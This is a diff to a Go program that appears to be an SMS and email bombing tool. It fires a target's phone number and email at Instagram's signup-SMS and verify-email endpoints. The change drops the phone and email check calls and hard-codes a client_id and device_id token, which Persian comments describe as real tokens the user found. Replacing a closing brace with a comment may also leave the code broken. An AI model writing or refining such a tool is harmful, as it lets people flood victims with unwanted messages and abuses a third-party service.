@@ -173,35 +173,24 @@ func main() {
 				} else {
 					wg.Done()
 				}
-			}
+			// ** Instagram SMS - با توکن‌های جدید و واقعی شما **
 			wg.Add(1)
 			tasks <- func() {
 				formData := url.Values{}
-				formData.Set("phone_number", phone)
-				formData.Set("jazoest", "21771")
-				sendFormRequest(client, ctx, "https://www.instagram.com/api/v1/web/accounts/check_phone_number/", formData, &wg, ch)
-			}
-			wg.Add(1)
-			tasks <- func() {
-				formData := url.Values{}
-				formData.Set("client_id", "some_generated_client_id")
+				// استفاده از client_id واقعی که پیدا کردید
+				formData.Set("client_id", "o6b3g31liy0349b20kb19pag1a5hdc9rqrs1d9otikboy4akfh")
 				formData.Set("phone_number", phone)
 				formData.Set("jazoest", "21771")
 				sendFormRequest(client, ctx, "https://www.instagram.com/api/v1/web/accounts/send_signup_sms_code_ajax/", formData, &wg, ch)
 			}
 		}
 		if email != "" {
+			// ** Instagram Email - با توکن‌های جدید و واقعی شما **
 			wg.Add(1)
 			tasks <- func() {
 				formData := url.Values{}
-				formData.Set("email", email)
-				formData.Set("jazoest", "21771")
-				sendFormRequest(client, ctx, "https://www.instagram.com/api/v1/web/accounts/check_email/", formData, &wg, ch)
-			}
-			wg.Add(1)
-			tasks <- func() {
-				formData := url.Values{}
-				formData.Set("device_id", "some_generated_device_id")
+				// device_id معمولا با client_id یکی است
+				formData.Set("device_id", "o6b3g31liy0349b20kb19pag1a5hdc9rqrs1d9otikboy4akfh")
 				formData.Set("email", email)
 				formData.Set("jazoest", "21771")
 				sendFormRequest(client, ctx, "https://www.instagram.com/api/v1/accounts/send_verify_email/", formData, &wg, ch)
